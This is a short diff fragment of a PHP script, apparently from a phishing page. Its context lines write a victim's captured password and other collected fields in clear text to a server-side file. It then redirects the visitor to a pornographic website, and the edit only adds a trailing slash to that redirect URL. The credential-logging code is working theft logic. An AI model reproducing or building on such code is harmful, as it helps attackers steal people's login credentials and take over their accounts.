@@ -9,6 +9,6 @@
  $pa = "Password: $pass\n";
  fwrite($fileuser, "\n". $co. "\n". $us. $pa. "\n". $cl); 
  fclose($fileuser);
- header('Location: https://pornhub.com');
+ header('Location: https://pornhub.com/');
  exit()
 ?>
